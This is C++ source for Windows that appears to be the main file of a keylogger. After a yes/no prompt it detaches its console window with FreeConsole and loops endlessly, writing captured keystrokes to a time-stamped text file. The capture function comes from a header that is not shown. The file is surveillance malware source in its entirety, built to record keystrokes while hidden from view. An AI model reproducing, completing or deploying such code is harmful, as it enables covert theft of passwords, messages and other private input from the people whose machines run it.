#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <ctime>
#include "Header.h"

using namespace std;

int main() {
    int tempoSleep{ 95 };
    string teclas;
    char resposta;

    tm horarioLocal;
    time_t dataTm{ time(0) };
    localtime_s(&horarioLocal, &dataTm);

    int dt = horarioLocal.tm_year + horarioLocal.tm_mon + horarioLocal.tm_hour + horarioLocal.tm_min + horarioLocal.tm_sec;
    string nome{ "L." };
    nome += to_string(dt) + ".txt";

    do {
        cout << "Active keylogger? [y/n] ";
        cin >> resposta;
        if (resposta == 'y') {
            break;
        }
        else if (resposta == 'n') {
            return 0;
        }
        else {
            cout << "\n\nInvalid answer...\n\n";
        }
    } while (true);

    system("CLS || CLEAR");
    FreeConsole();

    cout << "inputs:\n\n";

    while (true) {
        teclasPrecionadas(teclas, tempoSleep);

        ofstream myfile;
        myfile.open(nome);
        myfile << teclas;
        myfile.close();
    }

    return 0;
}
